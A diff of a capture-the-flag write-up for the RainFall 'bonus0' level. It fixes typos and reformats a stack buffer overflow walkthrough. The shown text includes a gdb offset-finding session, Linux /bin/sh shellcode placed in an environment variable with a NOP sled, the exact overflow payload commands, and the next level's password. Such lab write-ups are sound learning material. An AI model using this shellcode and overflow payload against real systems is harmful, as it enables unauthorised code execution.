@@ -8,7 +8,7 @@
 
 The first step here is to rewrite the original code in C.
 
-We can the see that in p() we can read 4096 characters in a non null-terminated buffer.
+We can then see that in p() we can read 4096 characters in a non null-terminated buffer.
 strncpy is then called to copy at most 20 bytes and as the man says:
 
 Warning:
@@ -25,6 +25,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x42424242 in ?? ()
 
 We are again using https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
 (gdb) run
 BBBBBBBBBBBBBBBBBBBB
 Aa0Aa1Aa2Aa3Aa4Aa5Aa
@@ -35,7 +36,7 @@ Here, the program is trying to read code at a pointer defined by our input !
 We just have to write a pointer that makes sense.
 Here, we cannot store our code in the Heap (no malloc)
 or the Stack (the buffer that contains the input goes out of scope).
-So we eill store the shellcode in an env var.
+So we will store the shellcode in an env var.
 
 We are using the same shellcode as in level 9.
 
@@ -44,13 +45,14 @@ On the host:
 ~$ scp -P 4242 ./getenv bonus0@192.168.122.237:/tmp
 
 On the VM:
-~$ export SCODE=$(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
-~$ /tmp/getenv SCODE
+bonus0@RainFall:~$ export SCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+bonus0@RainFall:~$ /tmp/getenv SCODE
 SCODE @ 0xbffff7d0 -> \xd0\xf7\xff\xbf
-~$ python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xd0\xf7\xff\xbf' > /tmp/pb0; cat /tmp/pb0 - | ./bonus0
-# Oops, the second input needs to be bigger for the exploit to work
-# Let's try again:
-~$ python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xd0\xf7\xff\xbf' + 'C'*7" > /tmp/pb0; cat /tmp/pb0 - | ./bonus0
 
+bonus0@RainFall:~$ python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xd0\xf7\xff\xbf'" > /tmp/pb0; cat /tmp/pb0 - | ./bonus0
+# Oops, the second input needs to be bigger for the exploit to work
+
+# Let's try again:
+bonus0@RainFall:~$ python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xd0\xf7\xff\xbf' + 'C'*7" > /tmp/pb0; cat /tmp/pb0 - | ./bonus0
 cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
